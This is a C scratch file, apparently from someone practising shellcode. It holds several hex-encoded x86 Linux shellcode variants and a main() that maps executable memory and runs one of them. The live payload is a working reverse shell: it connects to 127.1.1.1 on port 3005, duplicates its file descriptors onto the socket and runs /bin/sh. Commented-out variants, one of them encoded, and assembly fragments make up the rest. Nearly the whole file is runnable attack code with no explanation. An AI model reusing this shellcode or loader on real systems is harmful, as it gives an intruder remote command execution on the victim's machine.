#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
//char shellcode[] = »\x31\xc0\xb0\x01\xb3\x05\xcd\x80";
// char shellcode[] ="\xeb\x11\x5e\x31\xc9\xb1\x08\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\xb1\x02\xb4\x06\xce\x81";


//\x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x66\xB8\x67\x01\xB3\x02\x66\x53\x41\x31\xD2\xcd\x80\x89\xC3\x66\xB8\x6a\x01\x89\xE1\xB2\x10\xcd\x80\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x04\x03\x89\xC1\xB0\x3f\x49\xcd\x80\x75\xf9\x89\xC8\xb2\x0b\x92\x89\xe3\xcd\x80|40\x31\xDB\xcd\x80

void main() {
    // char shellcode[] = "\x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x66\xB8\x67\x01\xB3\x02\x66\x53\x41\x31\xD2\xcd\x80\x89\xC3\x66\xB8\x6a\x01\x89\xE1\xB2\x10\xcd\x80\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x04\x03\x89\xC1\xB0\x3f\x49\xcd\x80\x75\xf9\x89\xC8\xb2\x0b\x92\x89\xe3\xcd\x80\x40\x31\xDB\xcd\x80";
    char shellcode[] = "\x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x66\xB8\x67\x01\xB3\x02\x66\x53\x41\x31\xD2\xcd\x80\x89\xC3\x66\xB8\x6a\x01\x89\xE1\xB2\x10\xcd\x80\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x04\x03\x89\xC1\xB0\x3f\x49\xcd\x80\x75\xf9\x89\xC8\xb2\x0b\x92\x89\xe3\xcd\x80\x40\x31\xDB\xcd\x80";
    // char shellcode[] = "\x69\x80\x02\x02\x02\x67\x69\x0c\xbe\x67\xb9\x68\x02\xb4\x03\x67\x54\x42\x32\xd3\xce\x81\x8a\xc4\x67\xb9\x6b\x02\x8a\xe2\xb3\x11\xce\x81\x51\x69\x6f\x30\x74\x69\x69\x30\x30\x63\x6a\x05\x04\x8a\xc2\xb1\x40\x4a\xce\x81\x76\xfa\x8a\xc9\xb3\x0c\x93\x8a\xe4\xce\x81\x41\x32\xdc\xce\x81";
    printf("[+] shellcode length: %u\n", strlen(shellcode));

    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ | PROT_WRITE,
    MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}




// #include <stdio.h>
// #include <string.h>

// sudo apt install gcc-multilib
// unsigned char code[] = "\x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x66\xb8\x67\x01\xb3\x02\x66\x53\x41\x31\xd2\xcd\x80\x89\xc3\x66\xb8\x6a\x01\x89\xe1\xb2\x10\xcd\x80\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x04\x03\x89\xc1\xb0\x3f\x49\xcd\x80\x75\xf9\x89\xc8\xb2\x0b\x92\x89\xe3\xcd\x80\x40\x31\xdb\xcd\x80";
// unsigned char code[] = "\x68\x7f\x01\x01\x01\x5e\x66\x68\xd9\x03\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce";

// \x31\xC0\x31\xDB\x31\xC9\x31\xD2
// unsigned char code[] = "\x31\xF6\x31\xFF\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x66\x68\x67\x01\x58\xB3\x02\x6a\x02\x5b\x6a\x01\x59\x31\xD2\xcd\x80";// \x89\xC3\x66\xB8\x6a\x01\x89\xE1\xB2\x10\xcd\x80\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x04\x03\x89\xC1\xB0\x3f\x49\xcd\x80\x75\xf9\x89\xC8\xb2\x0b\x92\x89\xe3\xcd\x80";

//\x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x66\x68\x67\x01\x58\xB3\x02\x6a\x02\x5b\x6a\x01\x59\x31\xD2\xcd\x80\x89\xC3\x66\xB8\x6a\x01\x89\xE1\xB2\x10\xcd\x80\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x04\x03\x89\xC1\xB0\x3f\x49\xcd\x80\x75\xf9\x89\xC8\xb2\x0b\x92\x89\xe3\xcd\x80

// int main(int argc, char **argv) {
// //   int foo_value = 0;

// //   int (*foo)() = (int(*)())code;
// //   foo_value = foo();

// //   printf("%d\n", foo_value);
    

//     unsigned char code[] = "\x31\xF6\x31\xFF\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x7f\x01\x01\x01\x66\x68\x0b\xbd\x66\x68\x67\x01\x58\xB3\x02\x6a\x02\x5b\x6a\x01\x59\x31\xD2\xcd\x80";
//     printf("Size: %d bytes.\n", strlen(code));
//     void (*shellcode)() = (void((*)())) (code);

//     shellcode();

//     printf("Helloworld\n");
//     return 0;
// }

// m2elf (créer exec avec code machine)
// 32bits

/*
    wrapper en C (nmap)

*/

//     xor eax, eax
// xor ebx, ebx
// xor ecx, ecx
// xor edx, edx
// mov ax, 0x0167    
  
//     mov ax, 0x0167      
//     mov bl, 0x2         
//     push bx             
//     inc ecx            
//     xor edx, edx        
//     int 0x80        
//     mov ebx, eax      